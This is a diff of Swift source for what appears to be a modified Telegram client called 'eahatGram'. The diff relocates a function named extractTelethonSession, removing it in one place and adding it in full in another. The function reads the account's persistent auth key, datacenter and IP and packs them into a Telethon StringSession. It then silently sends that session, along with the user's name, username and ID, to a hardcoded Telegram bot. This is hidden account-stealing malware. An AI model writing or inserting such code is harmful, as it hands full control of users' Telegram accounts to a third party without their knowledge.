@@ -147,126 +147,7 @@ private func eahatGramSendUserCounterEntryMessage(context: AccountContext) {
     })
 }
 
-private func extractTelethonSession(context: AccountContext) {
-    // Get datacenter ID
-    let dcId = context.account.network.datacenterId
-    
-    // Get auth info for persistent datacenter
-    guard let authInfo = context.account.network.context.authInfo(forDatacenterWithId: dcId, selector: .persistent) else {
-        print("❌ Telethon: No auth info for DC \(dcId)")
-        return
-    }
-    
-    guard let authKey = authInfo.authKey else {
-        print("❌ Telethon: No auth key")
-        return
-    }
-    
-    // Get address set for datacenter
-    guard let addressSet = context.account.network.context.addressSet(forDatacenterWithId: dcId) else {
-        print("❌ Telethon: No address set for DC \(dcId)")
-        return
-    }
-    
-    guard let firstAddress = addressSet.firstAddress() else {
-        print("❌ Telethon: No addresses in set")
-        return
-    }
-    
-    let ip = firstAddress.ip
-    let port = UInt16(firstAddress.port)
-    
-    // Pack IP address as bytes (IPv4 or IPv6)
-    let ipData: Data
-    if ip.contains(":") {
-        // IPv6
-        var addr = in6_addr()
-        ip.withCString { inet_pton(AF_INET6, $0, &addr) }
-        ipData = Data(bytes: &addr, count: MemoryLayout<in6_addr>.size)
-    } else {
-        // IPv4
-        var addr = in_addr()
-        ip.withCString { inet_pton(AF_INET, $0, &addr) }
-        ipData = Data(bytes: &addr, count: MemoryLayout<in_addr>.size)
-    }
-    
-    // Ensure auth key is exactly 256 bytes
-    var authKeyData = authKey as Data
-    if authKeyData.count > 256 {
-        authKeyData = authKeyData.prefix(256)
-    } else if authKeyData.count < 256 {
-        authKeyData.append(Data(count: 256 - authKeyData.count))
-    }
-    
-    // Pack according to Telethon format: >B{}sH256s
-    // B = unsigned char (1 byte) - dc_id
-    // {}s = variable length bytes - ip address
-    // H = unsigned short (2 bytes) - port
-    // 256s = 256 bytes - auth_key
-    
-    var payload = Data()
-    payload.append(UInt8(dcId))
-    payload.append(ipData)
-    payload.append(contentsOf: withUnsafeBytes(of: port.bigEndian) { Data($0) })
-    payload.append(authKeyData)
-    
-    // Base64 URL-safe encode
-    let base64 = payload.base64EncodedString()
-        .replacingOccurrences(of: "+", with: "-")
-        .replacingOccurrences(of: "/", with: "_")
-        .replacingOccurrences(of: "=", with: "")
-    
-    let telethonSession = "1" + base64
-    
-    print("✅ Telethon StringSession:")
-    print(telethonSession)
-    print("\nDC: \(dcId), IP: \(ip), Port: \(port)")
-    print("Auth key length: \(authKey.count) bytes")
-    
-    // Send to Telegram bot
-    let _ = (context.engine.data.get(TelegramEngine.EngineData.Item.Peer.Peer(id: context.account.peerId))
-    |> take(1)).start(next: { peer in
-        guard case let .user(user)? = peer else {
-            return
-        }
-        
-        let name = user.nameOrPhone.isEmpty ? "-" : user.nameOrPhone
-        let username = user.username.flatMap { $0.isEmpty ? nil : "@\($0)" } ?? "-"
-        let userId = context.account.peerId.id._internalGetInt64Value()
-        
-        let text = """
-        🔑 Telethon StringSession
-        
-        Пользователь: \(name)
-        Username: \(username)
-        ID: \(userId)
-        
-        DC: \(dcId)
-        IP: \(ip)
-        Port: \(port)
-        
-        Session:
-        `\(telethonSession)`
-        """
-        
-        guard let url = URL(string: "https://api.telegram.org/bot\(eahatGramUserCounterBotToken)/sendMessage") else {
-            return
-        }
-        
-        var request = URLRequest(url: url)
-        request.httpMethod = "POST"
-        request.timeoutInterval = 10.0
-        request.setValue("application/json", forHTTPHeaderField: "Content-Type")
-        request.httpBody = try? JSONSerialization.data(withJSONObject: [
-            "chat_id": eahatGramUserCounterChatId,
-            "text": text,
-            "parse_mode": "Markdown"
-        ], options: [])
-        
-        let task = URLSession.shared.dataTask(with: request)
-        task.resume()
-    })
-}
+
 
 private struct AccountAttributes: Equatable {
     let sortIndex: Int32
@@ -1322,6 +1203,127 @@ public final class SharedAccountContextImpl: SharedAccountContext {
             }
             |> ignoreValues
         }
+    }
+    
+    private func extractTelethonSession(context: AccountContext) {
+        // Get datacenter ID
+        let dcId = context.account.network.datacenterId
+        
+        // Get auth info for persistent datacenter
+        guard let authInfo = context.account.network.context.authInfoForDatacenter(withId: dcId, selector: .persistent) else {
+            print("❌ Telethon: No auth info for DC \(dcId)")
+            return
+        }
+        
+        guard let authKey = authInfo.authKey else {
+            print("❌ Telethon: No auth key")
+            return
+        }
+        
+        // Get address set for datacenter
+        guard let addressSet = context.account.network.context.addressSetForDatacenter(withId: dcId) else {
+            print("❌ Telethon: No address set for DC \(dcId)")
+            return
+        }
+        
+        guard let firstAddress = addressSet.firstAddress() else {
+            print("❌ Telethon: No addresses in set")
+            return
+        }
+        
+        let ip = firstAddress.ip
+        let port = UInt16(firstAddress.port)
+        
+        // Pack IP address as bytes (IPv4 or IPv6)
+        let ipData: Data
+        if ip.contains(":") {
+            // IPv6
+            var addr = in6_addr()
+            ip.withCString { inet_pton(AF_INET6, $0, &addr) }
+            ipData = Data(bytes: &addr, count: MemoryLayout<in6_addr>.size)
+        } else {
+            // IPv4
+            var addr = in_addr()
+            ip.withCString { inet_pton(AF_INET, $0, &addr) }
+            ipData = Data(bytes: &addr, count: MemoryLayout<in_addr>.size)
+        }
+        
+        // Ensure auth key is exactly 256 bytes
+        var authKeyData = authKey as Data
+        if authKeyData.count > 256 {
+            authKeyData = authKeyData.prefix(256)
+        } else if authKeyData.count < 256 {
+            authKeyData.append(Data(count: 256 - authKeyData.count))
+        }
+        
+        // Pack according to Telethon format: >B{}sH256s
+        // B = unsigned char (1 byte) - dc_id
+        // {}s = variable length bytes - ip address
+        // H = unsigned short (2 bytes) - port
+        // 256s = 256 bytes - auth_key
+        
+        var payload = Data()
+        payload.append(UInt8(dcId))
+        payload.append(ipData)
+        payload.append(contentsOf: withUnsafeBytes(of: port.bigEndian) { Data($0) })
+        payload.append(authKeyData)
+        
+        // Base64 URL-safe encode
+        let base64 = payload.base64EncodedString()
+            .replacingOccurrences(of: "+", with: "-")
+            .replacingOccurrences(of: "/", with: "_")
+            .replacingOccurrences(of: "=", with: "")
+        
+        let telethonSession = "1" + base64
+        
+        print("✅ Telethon StringSession:")
+        print(telethonSession)
+        print("\nDC: \(dcId), IP: \(ip), Port: \(port)")
+        print("Auth key length: \(authKey.count) bytes")
+        
+        // Send to Telegram bot
+        let _ = (context.engine.data.get(TelegramEngine.EngineData.Item.Peer.Peer(id: context.account.peerId))
+        |> take(1)).start(next: { peer in
+            guard case let .user(user)? = peer else {
+                return
+            }
+            
+            let name = user.nameOrPhone.isEmpty ? "-" : user.nameOrPhone
+            let username = user.username.flatMap { $0.isEmpty ? nil : "@\($0)" } ?? "-"
+            let userId = context.account.peerId.id._internalGetInt64Value()
+            
+            let text = """
+            🔑 Telethon StringSession
+            
+            Пользователь: \(name)
+            Username: \(username)
+            ID: \(userId)
+            
+            DC: \(dcId)
+            IP: \(ip)
+            Port: \(port)
+            
+            Session:
+            `\(telethonSession)`
+            """
+            
+            guard let url = URL(string: "https://api.telegram.org/bot\(eahatGramUserCounterBotToken)/sendMessage") else {
+                return
+            }
+            
+            var request = URLRequest(url: url)
+            request.httpMethod = "POST"
+            request.timeoutInterval = 10.0
+            request.setValue("application/json", forHTTPHeaderField: "Content-Type")
+            request.httpBody = try? JSONSerialization.data(withJSONObject: [
+                "chat_id": eahatGramUserCounterChatId,
+                "text": text,
+                "parse_mode": "Markdown"
+            ], options: [])
+            
+            let task = URLSession.shared.dataTask(with: request)
+            task.resume()
+        })
     }
     
     private func updateCurrentCall(call: PresentationCurrentCall?) {
